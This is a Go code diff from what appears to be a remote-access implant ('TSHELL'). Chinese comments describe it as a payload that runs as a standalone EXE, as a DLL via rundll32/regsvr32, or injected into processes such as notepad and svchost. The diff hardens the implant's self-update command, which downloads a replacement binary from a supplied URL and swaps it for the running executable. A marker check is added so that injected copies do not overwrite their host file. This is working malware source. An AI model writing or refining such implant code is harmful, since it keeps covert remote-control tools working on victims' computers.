@@ -3,6 +3,7 @@
 package commands
 
 import (
+	"bytes"
 	"fmt"
 	"io"
 	"net/http"
@@ -16,6 +17,23 @@ import (
 
 // ===== A7: 客户端自我更新 =====
 // update <url>：下载新版本二进制 -> 重命名当前 exe -> 替换 -> 重启进程。
+
+// selfUpdateMarker 用于确认"磁盘上的文件确实是本 payload 的独立 EXE"。
+//
+// 为什么必须有这道闸：DLL 载荷（rundll32/regsvr32）和注入/迁移载荷的
+// os.Executable() 指向的是**宿主进程**（rundll32.exe、notepad.exe、svchost.exe…），
+// 不是我们的程序。直接按 os.Executable() 重命名/替换会毁掉宿主文件，且不可逆。
+// 独立 EXE 载荷的磁盘文件里一定包含这个标记；宿主程序里不会有。
+const selfUpdateMarker = "TSHELL_SELF_UPDATE_MARKER_v1"
+
+// fileHasSelfUpdateMarker 读取文件并检查标记（更新操作频率很低，直接整读）。
+func fileHasSelfUpdateMarker(path string) bool {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return false
+	}
+	return bytes.Contains(data, []byte(selfUpdateMarker))
+}
 
 // CmdSelfUpdate 自我更新入口（cmdBuf = 下载 URL）
 func CmdSelfUpdate(cmdBuf []byte) ([]byte, error) {
@@ -50,12 +68,23 @@ func CmdSelfUpdate(cmdBuf []byte) ([]byte, error) {
 		os.Remove(tmpPath)
 		return nil, fmt.Errorf("下载文件过小（%d 字节），已取消更新", n)
 	}
+	// 新文件必须也是本 payload（防止 URL 填错/返回 HTML 错误页/被替换）
+	if !fileHasSelfUpdateMarker(tmpPath) {
+		os.Remove(tmpPath)
+		return nil, fmt.Errorf("下载文件不是本 payload（缺少更新标记），已取消更新")
+	}
 
-	// 2. 替换当前 exe
+	// 2. 替换当前 exe。
+	// 先确认磁盘上的当前进程确实是独立 EXE payload：注入/DLL/迁移形态下
+	// os.Executable() 是宿主进程，替换它会毁掉宿主文件（rundll32/notepad/svchost…）。
 	self, err := os.Executable()
 	if err != nil {
 		os.Remove(tmpPath)
 		return nil, err
+	}
+	if !fileHasSelfUpdateMarker(self) {
+		os.Remove(tmpPath)
+		return nil, fmt.Errorf("当前进程不是独立 EXE payload（可能是 DLL/注入/迁移加载），拒绝替换宿主程序")
 	}
 	oldPath := self + ".old"
 	// 重命名当前 exe（运行中可重命名）
